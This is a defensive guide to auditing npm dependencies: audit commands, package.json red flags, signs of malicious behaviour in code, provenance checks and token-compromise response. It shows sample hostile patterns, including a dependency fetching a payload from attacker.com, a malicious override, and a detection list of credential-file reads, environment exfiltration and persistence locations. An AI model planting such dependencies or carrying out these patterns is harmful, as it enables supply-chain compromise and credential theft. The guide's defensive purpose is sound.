# Dependency Audit Techniques

## Quick Triage Commands

### npm audit (built-in)
```bash
# Standard audit
npm audit

# JSON output for parsing
npm audit --json

# Only high/critical
npm audit --audit-level=high

# Fix automatically (caution: may break things)
npm audit fix

# Verify package signatures (provenance)
npm audit signatures
```

### Package investigation
```bash
# Full package metadata
npm view <package> --json

# Who published this version?
npm view <package> maintainers

# Publication timeline
npm view <package> time --json

# Check if package was recently transferred
npm view <package> repository.url

# Compare installed vs published
npm pack <package> --dry-run
```

### Dependency tree analysis
```bash
# Full dependency tree
npm ls --all

# Find why a package is installed
npm explain <package>

# Find duplicate packages
npm dedupe --dry-run

# List outdated packages
npm outdated
```

## Red Flags in package.json

### Install Scripts (highest risk)
```json
{
  "scripts": {
    "preinstall": "node setup.js",     // Runs BEFORE install
    "install": "node-gyp rebuild",      // Runs during install
    "postinstall": "node bootstrap.js"  // Runs AFTER install
  }
}
```

**When legitimate**: Native addons (node-gyp), Electron rebuilds, Prisma generate
**When suspicious**: Unknown packages, packages that don't need native code

### Remote Dynamic Dependencies (RDD)
```json
{
  "dependencies": {
    "legit-package": "^1.0.0",
    "evil-dep": "https://attacker.com/payload.tgz",     // RED FLAG
    "also-evil": "git+https://github.com/evil/repo.git"  // RED FLAG
  }
}
```

### Suspicious Overrides
```json
{
  "overrides": {
    "legit-package": "npm:malicious-package@1.0.0"  // Replaces legit with malicious
  }
}
```

## Behavioral Analysis (what to check in code)

### Network access patterns
Expected: HTTP clients, API libraries, database connectors
Unexpected in utility packages:
- `fetch()` / `http.request()` / `https.get()`
- `child_process.exec('curl ...')`
- WebSocket connections
- DNS queries to unusual domains

### File system access patterns
Expected: Config readers, loggers, file processors
Unexpected:
- Reading `~/.npmrc`, `~/.gitconfig`, `~/.ssh/`
- Reading `process.env` and sending it somewhere
- Writing to `~/.config/systemd/user/` (persistence)
- Scanning for token files across the filesystem

### Code execution patterns
Expected: Template engines, bundlers, transpilers
Unexpected:
- `eval()` with input from network
- `new Function()` with dynamic code
- `child_process.exec()` with constructed commands
- `require()` with variable path from network response
- `vm.runInContext()` with untrusted code

## Provenance Verification

### npm provenance (if available)
```bash
# Check if package has provenance attestation
npm view <package> --json | jq '.dist.attestations'

# Verify the build was from the claimed CI
npm audit signatures
```

### Manual verification
1. Check package's `repository.url` in package.json
2. Clone that repo
3. Build from source: `npm pack` in the cloned repo
4. Compare the tarball hash with what npm installed
5. If they differ → package was modified after the repo build

### Lock file analysis
```bash
# Check integrity hashes haven't changed unexpectedly
git diff package-lock.json | grep '"integrity"'

# Verify all packages resolve to expected registry
grep -v 'registry.npmjs.org' package-lock.json | grep '"resolved"'
```

## Automated Monitoring

### GitHub Dependabot
- Enable in repo settings
- Configure `dependabot.yml` for npm updates
- Review all dependency PRs carefully

### Socket.dev
- CLI: `socket npm audit`
- Checks for install scripts, network access, filesystem access
- Free tier available

### Snyk
- CLI: `snyk test`
- Checks known vulnerabilities
- Monitors for new CVEs

## Emergency Response: Compromised npm Token

If you suspect your npm token was stolen:

1. **Immediately revoke ALL tokens**:
   ```bash
   npm token list
   npm token revoke <token-id>  # For each token
   ```

2. **Check for unauthorized publishes**:
   ```bash
   # List all your packages
   npm access ls-packages
   
   # For each package, check recent versions
   npm view <package> time --json
   ```

3. **If unauthorized versions were published**:
   ```bash
   npm unpublish <package>@<malicious-version>
   npm deprecate <package>@<malicious-version> "SECURITY: Unauthorized publish. Do not use."
   ```

4. **Rotate ALL secrets** that were in your environment:
   - AWS/GCP/Azure credentials
   - Database connection strings
   - API keys
   - GitHub tokens
   - Any other secrets in `.env` files

5. **Check for persistence**:
   ```bash
   # systemd services
   ls ~/.config/systemd/user/
   systemctl --user list-units
   
   # cron jobs
   crontab -l
   
   # startup scripts
   ls ~/.bashrc ~/.profile ~/.zshrc  # Check for additions
   ```
